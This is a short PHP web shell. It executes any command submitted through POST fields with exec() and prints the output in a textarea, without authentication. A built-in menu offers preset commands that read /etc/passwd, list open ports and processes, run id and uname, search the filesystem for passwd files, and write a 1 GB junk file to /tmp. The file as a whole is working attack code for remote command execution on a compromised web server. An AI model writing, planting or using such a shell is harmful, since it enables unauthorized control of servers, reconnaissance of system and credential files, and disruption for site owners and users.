<?php
$precmd = array(''=>'','Read /etc/passwd'=>'cat /etc/passwd','Open ports'=>'netstat -an',
	'Running Processes'=>'ps -aux', 'Uname'=>'uname -a', 'Get UID'=>'id',
	'Create Junkfile (/tmp/z)'=>'dd if=/dev/zero of=/tmp/z bs=1M count=1024',
	'Find passwd files'=>'find / -type f -name passwd');
$capt = array_flip($precmd);
foreach($precmd as $c){
	echo("<option value='" . $c . "'>" . $capt[$c] . "\n");
}

if($_POST['cmd'] != "")
	$x = $_POST['cmd'];
elseif($_POST['precmd'] != "")
	$x = $_POST['precmd'];
else
	die();

echo("Results: <br><textarea rows=20 cols=100>");
$cmd = @exec($x, $result);
	
	
foreach($result as $line)
	echo($line . "\n");
echo("</textarea>");

?>